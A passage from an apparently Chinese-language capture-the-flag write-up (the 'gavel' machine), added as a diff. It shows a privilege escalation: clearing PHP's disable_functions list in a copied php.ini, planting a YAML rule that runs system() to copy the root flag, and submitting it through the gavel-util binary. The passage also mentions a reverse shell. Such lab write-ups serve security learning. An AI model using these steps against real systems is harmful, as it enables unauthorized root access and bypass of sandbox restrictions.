@@ -364,3 +364,32 @@ allow_url_include=Off
 ```
 #### 了解了这一切之后，滥用这种手段的步骤如下。
 #### 1. 复制原始的 php.ini 文件，并对其进行编辑，以使 system() 函数及其他危险函数能够正常使用。“允许；准许”
+```
+auctioneer@gavel:/$ cd ~
+auctioneer@gavel:~$ cp /opt/gavel/.config/php/php.ini .
+auctioneer@gavel:~$ sed -i 's/disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client/disable_functions=/g' php.ini
+```
+#### 2. 创建一个新的 YAML 文件来提交恶意规则。
+```
+auctioneer@gavel:~$ cat << 'EOF' > item.yaml
+> name: Exploit
+> description: Exploiting
+> image: test.png
+> price: 1
+> rule_msg: Exploiting
+> rule: |
+>   system('cat /root/root.txt > /home/auctioneer/root.txt');
+>   return true;
+> EOF
+```
+#### 请注意，在这种情况下，我们使用了 system() 函数将根标志复制到 /home/auctioneer/ 目录下。不过，您也可以像我们之前那样使用反向 shell 。
+#### 3. 使用“gavel-util”二进制文件提交该规则
+```
+auctioneer@gavel:~$ RULE_PATH=/home/auctioneer/php.ini gavel-util submit item.yaml
+Item submitted for review in next auction
+```
+```
+auctioneer@gavel:~$ ls
+item.yaml  php.ini  root.txt  user.txt
+auctioneer@gavel:~$ cat /home/auctioneer/root.txt
+```
